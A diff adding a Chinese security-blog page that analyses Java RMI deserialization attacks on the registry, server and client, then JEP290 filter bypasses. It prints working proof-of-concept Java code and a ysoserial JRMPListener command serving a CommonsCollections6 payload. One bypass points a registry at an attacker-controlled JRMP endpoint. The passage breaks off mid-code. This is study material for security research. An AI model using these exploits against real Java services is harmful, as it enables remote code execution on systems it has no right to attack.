@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>Java RMI攻击分析与总结 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Java RMI攻击分析与总结 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2022/02/16/Java_RMI攻击分析与总结/">
+<meta property="twitter:image" content="https://blog.play2win.top/2022/02/16/Java_RMI攻击分析与总结/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="Java RMI攻击分析与总结" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="Java RMI攻击分析与总结" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2022-02-16T12:42:53.000Z">2022-02-16</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    25 分钟 读完 (大约 3689 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Java RMI攻击分析与总结
+            
+        </h1>
+        <div class="content">
+            <h2 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h2><p><strong>Java远程方法调用</strong>，即<strong>Java RMI</strong>（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。它是由注册中心、服务端和客户端三部分组成。</p>
+<ul>
+<li><p>注册中心</p>
+<p>作为存储远程方法的代理对象的仓库。</p>
+</li>
+<li><p>服务端</p>
+<p>暴露远程对象，并将其代理对象注册进 RMI Registry。一个代理对象在服务端中包含一个skeleton对象，用于接受来自stub对象的调用。</p>
+</li>
+<li><p>客户端</p>
+<p>查找远程代理对象，远程调用服务对象。一个代理对象在调用该远程对象的客户端上包含一个stub对象，负责调用参数和返回值的序列化、打包解包，以及网络层的通讯过程。</p>
+</li>
+</ul>
+<a id="more"></a>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>RMI的各种攻击方式本质上是利用对象传输过程中反序列化实现的，以下是几种常见的攻击方式。</p>
+<h3 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h3><p>当服务端向注册中心注册时，注册中心会反序列化服务端绑定的对象，具体体现在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>。当服务端注册绑定的是一个恶意的对象时，就可造成反序列化漏洞。当然，由于绑定的对象需要时<code>Remote</code>对象，所以恶意对象需要实现使用代理类或改写注册方法才能注册绑定。</p>
+<p>在远程方法实例化的过程中，调用的父类<code>java.rmi.server.UnicastRemoteObject</code>的构造方法，最终是调用了<code>sun.rmi.server.Util#createProxy</code>方法创建<code>Remote</code>的动态代理类对象并返回。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 115251.png" alt></p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 115940.png" alt></p>
+<p>POC中的动态代理类按照<code>createProxy</code>方法中逻辑写即可，其中<code>InvocationHandler</code>子类通常选择<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，它具有<code>Map&lt;String, Object&gt;</code>类型的属性<code>memberValues</code>可以很方便的绑定反序列化的恶意对象。</p>
+<p>最终POC如下：</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="hljs-string">"obj"</span>, evilObject());</span><br><span class="line"></span><br><span class="line">InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);</span><br><span class="line">Remote remoteObj = (Remote) Proxy.newProxyInstance(</span><br><span class="line">    Remote.class.getClassLoader(),</span><br><span class="line">    <span class="hljs-keyword">new</span> Class[]&#123;Remote.class&#125;,</span><br><span class="line">    invocationHandler</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">1009</span>);</span><br><span class="line">registry.bind(<span class="hljs-string">"AttackRegistry"</span>, remoteObj);</span><br></pre></td></tr></table></figure>
+<h3 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h3><h4 id="反序列化参数"><a href="#反序列化参数" class="headerlink" title="反序列化参数"></a>反序列化参数</h4><p>攻击服务端其中一种方法是通过反序列化远程方法参数实现的。服务端反序列化参数体现在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法里调用的<code>unmarshalParameters</code>方法，最终通过<code>sun.rmi.server.UnicastRef#unmarshalValue</code>方法反序列化非基本类型的参数。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unmarshalValue</span><span class="hljs-params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反序列化参数的利用POC比较简单，但需要服务端以<code>Object</code>未参数的远程方法，Demo如下：</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 接口</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IRemoteMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> IRemoteMethod <span class="hljs-title">exploit</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 实现类</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RemoteMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IRemoteMethod</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">RemoteMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> IRemoteMethod <span class="hljs-title">exploit</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在客户端里放上同样的接口，从注册中心获取远程方法信息，并以恶意对象调用远程方法即可。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    IRemoteMethod remoteMethod = (IRemoteMethod) <span class="hljs-keyword">new</span> InitialContext().lookup(<span class="hljs-string">"rmi://192.168.78.137:1009/RemoteMethod"</span><span class="hljs-string">");</span></span><br><span class="line"><span class="hljs-string">    remoteMethod.exploit(evilObject());</span></span><br><span class="line"><span class="hljs-string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>对于非Object参数，但又是Object子类的远程方法，可以用动态代理或继承该子类的方法绕过。</p>
+<h3 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h3><h4 id="反序列化注册绑定对象"><a href="#反序列化注册绑定对象" class="headerlink" title="反序列化注册绑定对象"></a>反序列化注册绑定对象</h4><p>当客户端<code>lookup</code>时，也会从注册中心获取并反序列化注册绑定的对象，这时的反序列化是在存根<code>sun.rmi.registry.RegistryImpl_Stub#lookup</code>方法中进行。POC的构造也与注册中心反序列化的差不多，只是改成由注册中心注册绑定恶意类：</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="hljs-string">"obj"</span>, evilObject());</span><br><span class="line"></span><br><span class="line">InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);</span><br><span class="line">Remote remoteObj = (Remote) Proxy.newProxyInstance(</span><br><span class="line">    Remote.class.getClassLoader(),</span><br><span class="line">    <span class="hljs-keyword">new</span> Class[]&#123;Remote.class&#125;,</span><br><span class="line">    invocationHandler</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1009</span>);</span><br><span class="line">registry.bind(<span class="hljs-string">"AttackRegistry"</span>, remoteObj);</span><br></pre></td></tr></table></figure>
+<h4 id="反序列化返回值"><a href="#反序列化返回值" class="headerlink" title="反序列化返回值"></a>反序列化返回值</h4><p>当远程方法的返回值不为空，且不为基础类型时，就会对返回值进行反序列化。反序列化返回值与服务端反序列化参数的调用栈类似，最终都是通过<code>sun.rmi.server.UnicastRef#unmarshalValue</code>方法反序列化。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 162526.png" alt></p>
+<p>POC也很简单，远程方法直接返回恶意对象即可：</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AttackerRemoteMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IAttackerRemoteMethod</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">exploit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> evilObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="JEP290及其绕过"><a href="#JEP290及其绕过" class="headerlink" title="JEP290及其绕过"></a>JEP290及其绕过</h2><p>JEP290是JDK9引入的规范，并且向下兼容到JDK 8u121、JDK 7u131和JDK 6u141。其核心机制是由序列化客户端实现并设置在<code>ObjectInputStream</code>，在反序列化过程中调用过滤器接口方法来验证正在反序列化的类、正在创建的数组的大小以及反序列化的长度、深度和反序列化时引用的数量，返回<code>REJECTED</code>、<code>ALLOWED</code>或<code>UNDECIDED</code>状态。他的过滤接口方法并不是默认配置的，而是通过<code>jdk.serialFilter</code>属性设置全局过滤接口方法或<code>setObjectInputFilter</code>方法设置局部过滤接口方法。</p>
+<p>在RMI反序列化过程中仅注册中心在<code>sun.rmi.registry.RegistryImpl#registryFilter</code>中实现，对反序列化的深度、数组大小和反序列化的类做了限制。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Status <span class="hljs-title">registryFilter</span><span class="hljs-params">(FilterInfo var0)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (registryFilter != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">        Status var1 = registryFilter.checkInput(var0);</span><br><span class="line">        <span class="hljs-keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (var0.depth() &gt; <span class="hljs-number">20L</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        Class var2 = var0.serialClass();</span><br><span class="line">        <span class="hljs-keyword">if</span> (var2 != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (!var2.isArray()) &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> var0.arrayLength() &gt;= <span class="hljs-number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="hljs-number">1000000L</span> ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="UnicastRef-类绕过"><a href="#UnicastRef-类绕过" class="headerlink" title="UnicastRef 类绕过"></a>UnicastRef 类绕过</h3><p>UnicastRef 是RMI注册中心反序列化白名单中的类，是正常bind对象后注册中心得到的stub中的属性。</p>
+<p>下面调试下正常的注册流程，直接在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>处，注册中心反序列化服务端bind对象开始。接着调用封装类的父类<code>RemoteObject</code>的自定义<code>readObject</code>方法。在这里会实例化Reference类<code>UnicastRef</code>，并调用他的<code>readExternal</code>反序列化。<code>readExternal</code>里接着调用<code>sun.rmi.transport.LiveRef#read</code>给<code>UnicastRef</code>的<code>ref</code>属性赋值。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">read:291, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:489, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:455, RemoteObject (java.rmi.server)</span><br><span class="line">...</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">dispatch:76, RegistryImpl_Skel (sun.rmi.registry)</span><br></pre></td></tr></table></figure>
+<p><code>sun.rmi.transport.LiveRef#read</code>方法里，主要逻辑是从输入流中获取<code>TCPEndpoint</code>和<code>ObjID</code>，来初始化<code>LiveRef</code>并返回。这里的<code>TCPEndpoint</code>记录着服务端监听的地址和端口，并且方法里保存<code>LiveRef</code>到输入流的操作会将<code>TCPEndpoint</code>保存到输入流的<code>incomingRefTable</code>属性中，这一步很关键。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 121218.png" alt></p>
+<p>反序列化结束后就是注册引用的流程。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 143742.png" alt></p>
+<p>在<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>方法首先利用反序列化的<code>UnicastRef</code>建立连接，返回一个<code>StreamRemoteCall</code>对象，接着调用它的<code>invoke</code>方法。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 144722.png" alt></p>
+<p><code>invoke</code>方法最后调用的是<code>StreamRemoteCall</code>对象的<code>executeCall</code>方法，通过<code>getInputStream</code>方法从<code>conn</code>属性获取输入流赋值给<code>in</code>属性，然后从输入流中获取一个字节赋给<code>var1</code>，进入switch语句中，为2则反序列化输入流。至此与UnicateRef绕过JEP290的流程就结束了。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">executeCall</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    DGCAckHandler var2 = <span class="hljs-keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">byte</span> var1;</span><br><span class="line">    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">this</span>.getInputStream();</span><br><span class="line">        var1 = <span class="hljs-keyword">this</span>.in.readByte();</span><br><span class="line">        <span class="hljs-keyword">this</span>.in.readID();</span><br><span class="line">    &#125; <span class="hljs-keyword">catch</span> (UnmarshalException var11) &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">switch</span>(var1) &#123;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:</span><br><span class="line">        Object var14;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            var14 = <span class="hljs-keyword">this</span>.in.readObject();</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UnmarshalException(<span class="hljs-string">"Error unmarshaling return"</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line">	...</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关于这个<code>var1</code>作用，查了AdoptOpenJDK的源码得知是JRMP协议中返回值的标记，正常返回值不会进行反序列化。UnicastRef绕过JEP290使用ysoserial中的JRMPlistener，其将报错返回改成反序列化的payload，实现命令执行。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 160535.png" alt></p>
+<p>最后服务端的代码如下，相比正常的流程可以控制<code>LiveRef</code>指向恶意的服务端ip和端口。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnicastRefBypass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry reg = LocateRegistry.getRegistry(<span class="hljs-string">"localhost"</span>, <span class="hljs-number">1009</span>);</span><br><span class="line">        ObjID id = <span class="hljs-keyword">new</span> ObjID(<span class="hljs-keyword">new</span> Random().nextInt());</span><br><span class="line">        TCPEndpoint te = <span class="hljs-keyword">new</span> TCPEndpoint(<span class="hljs-string">"10.91.33.139"</span>, <span class="hljs-number">3333</span>);</span><br><span class="line">        UnicastRef ref = <span class="hljs-keyword">new</span> UnicastRef(<span class="hljs-keyword">new</span> LiveRef(id, te, <span class="hljs-keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="hljs-keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(UnicastRefBypass.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="hljs-string">"UnicastRefBypass"</span>, proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="UnicastRemoteObject类绕过"><a href="#UnicastRemoteObject类绕过" class="headerlink" title="UnicastRemoteObject类绕过"></a>UnicastRemoteObject类绕过</h3><p>在8u231的修复中，<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前为输入流<code>filter</code>属性设置了过滤接口方法，在后续<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>中又捕获过滤接口方法抛出的<code>InvalidClassException</code>异常，清空输入流中<code>incomingRefTable</code>属性的值。前者使得利用<code>UnicastRef</code>类绕过方式在反序列化<code>Exception</code>返回值时无法反序列化任意类。</p>
+<p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-28 172121.png" alt></p>
+<p>国外安全研究员An Trinh在8u231版本发布前提出的一种<a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">绕过方式</a>，没有使用注册流程中注册中心发起连接到服务端的输入流，而是利用注册中心在反序列化服务端绑定的对象过程中发起JRMP请求，巧妙地绕过了过滤。</p>
+<p>先从直接反序列化构造的对象来复现下这个POC，首先用ysoserial起一个<code>JRMPListener</code>的exploit。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 &quot;calc&quot;</span><br></pre></td></tr></table></figure>
+<p>然后再现在下面的POC反序列化。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ObjID id = <span class="hljs-keyword">new</span> ObjID(<span class="hljs-keyword">new</span> Random().nextInt());</span><br><span class="line">TCPEndpoint te = <span class="hljs-keyword">new</span> TCPEndpoint(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">3333</span>);</span><br><span class="line">UnicastRef ref = <span class="hljs-keyword">new</span> UnicastRef(<span class="hljs-keyword">new</span> LiveRef(id, te, <span class="hljs-keyword">false</span>));</span><br><span class="line">RemoteObjectInvocationHandler obj = 